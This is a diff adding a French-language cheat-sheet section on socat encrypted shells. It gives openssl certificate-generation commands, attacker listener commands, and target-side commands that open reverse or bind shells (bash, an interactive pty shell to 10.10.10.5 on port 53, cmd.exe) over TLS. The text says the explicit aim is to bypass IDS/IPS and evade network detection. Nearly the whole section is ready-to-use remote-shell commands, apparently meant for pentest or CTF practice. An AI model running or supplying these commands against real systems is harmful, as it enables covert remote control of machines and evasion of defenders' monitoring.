@@ -457,3 +457,70 @@ Remove-Item C:\Windows\Temp\socat.exe
 🔐 **Ajoute SSL pour éviter détection réseau.**
 
 
+# 🛡️ Socat Encrypted Shells Cheat Sheet
+
+## 🎯 Pourquoi chiffrer une shell ?
+- Permet de **bypasser les IDS/IPS**.
+- Le trafic est **chiffré**, donc difficile à inspecter sans la clé.
+- Fonctionne pour **reverse** et **bind shells**.
+
+---
+
+## 🔐 Générer un certificat auto-signé
+```bash
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt > shell.pem
+```
+
+---
+
+## 🔁 Reverse Shell Chiffrée
+
+### 🎧 Listener (Attaquant)
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+```
+
+### 📡 Target (Shell)
+```bash
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+
+---
+
+## 🔁 Reverse Shell Chiffrée (avec TTY)
+
+### 🎧 Listener (Attaquant)
+```bash
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+```
+
+### 📡 Target
+```bash
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+---
+
+## 🔁 Bind Shell Chiffrée
+
+### 🎧 Listener (Target)
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+```
+
+### 📡 Client (Attaquant)
+```bash
+socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
+```
+
+---
+
+## 🧠 Remarques
+- Le **certificat doit être utilisé par l'écouteur** (listener).
+- Pour bind shell, la **machine cible** doit contenir le fichier `.pem`.
+- Compatible **Linux & Windows**, mais stabilité meilleure sous Linux.
+
+
+
+
